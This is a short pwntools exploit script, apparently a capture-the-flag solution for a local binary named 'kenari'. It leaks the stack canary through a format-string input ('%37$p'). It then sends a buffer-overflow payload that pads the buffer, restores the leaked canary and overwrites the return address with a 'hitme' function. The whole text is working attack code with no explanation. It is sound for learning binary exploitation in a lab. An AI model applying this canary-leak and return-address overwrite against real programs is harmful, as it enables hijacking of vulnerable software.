from pwn import *

exe = ('./kenari')
p = process(exe)
binary = context.binary = ELF(exe)
p.sendlineafter(b':',b'%37$p')
leak = int(p.recvline().strip().decode(),16)
payload = b'A'*(0x50-0x8)+p64(leak)+b'A'*8+p64(binary.symbols.hitme)
print(leak)
print(binary.symbols.hitme)
print(payload)
p.sendlineafter(b':',payload)
p.interactive()
